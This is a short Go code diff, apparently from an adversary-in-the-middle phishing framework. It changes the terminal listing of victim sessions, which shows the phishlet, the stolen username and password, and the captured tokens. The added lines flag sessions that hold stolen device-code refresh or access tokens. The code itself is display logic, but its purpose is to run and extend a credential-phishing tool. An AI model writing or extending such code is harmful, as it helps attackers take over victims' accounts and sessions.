@@ -1630,6 +1630,8 @@ func (t *Terminal) handleSessions(args []string) error {
 			tcol := dgray.Sprintf("none")
 			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
 				tcol = lgreen.Sprintf("captured")
+			} else if s.Custom["dc_refresh_token"] != "" || s.Custom["dc_access_token"] != "" {
+				tcol = cyan.Sprintf("dc_tokens")
 			}
 			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
 			rows = append(rows, row)
@@ -1662,6 +1664,8 @@ func (t *Terminal) handleSessions(args []string) error {
 				tcol := dgray.Sprintf("empty")
 				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
 					tcol = lgreen.Sprintf("captured")
+				} else if s.Custom["dc_refresh_token"] != "" || s.Custom["dc_access_token"] != "" {
+					tcol = cyan.Sprintf("dc_tokens")
 				}
 
 				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
